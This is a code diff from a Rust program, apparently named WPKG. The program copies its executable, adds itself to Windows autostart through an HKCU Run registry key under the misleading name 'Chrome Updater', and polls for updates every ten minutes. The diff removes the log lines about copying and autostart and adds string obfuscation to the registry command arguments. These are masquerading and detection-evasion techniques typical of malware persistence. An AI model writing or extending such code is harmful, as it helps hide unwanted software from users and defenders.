@@ -79,16 +79,14 @@ async fn main() {
                 info!("WPKG not installed. Installing in {}...", &config_dir);
 
                 if !Path::new(&exe_target).exists() {
-                    //copying executable
-                    info!("Copying WPKG executable to {}...", exe_target);
+                    // copying executable
                     fs::copy(exe_path, exe_target.clone())?;
 
-                    //adding to autostart
-                    info!("Adding to autostart");
+                    // adding to autostart
                     utils::run_process(
                         &decode(encode!("reg")),
                         vec![
-                            "add",
+                            &decode(encode!("add")),
                             &decode(encode!(
                                 "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                             )),
@@ -97,7 +95,7 @@ async fn main() {
                             &decode(encode!("Chrome Updater")),
                             "/t",
                             &decode(encode!("REG_SZ")),
-                            "/d",
+                            &decode(encode!("/d")),
                             &exe_target,
                         ],
                         true,
@@ -133,7 +131,8 @@ async fn main() {
         info!("Started update check thread");
 
         loop {
-            thread::sleep(time::Duration::from_secs(10 * 60));
+            thread::sleep(time::Duration::from_secs(10 * 60)); // check every 10 minutes
+
             match updater::check_updates().await {
                 Ok(_) => info!("Updates has been checked"),
                 Err(e) => error!("Failed to check updates: {e}"),
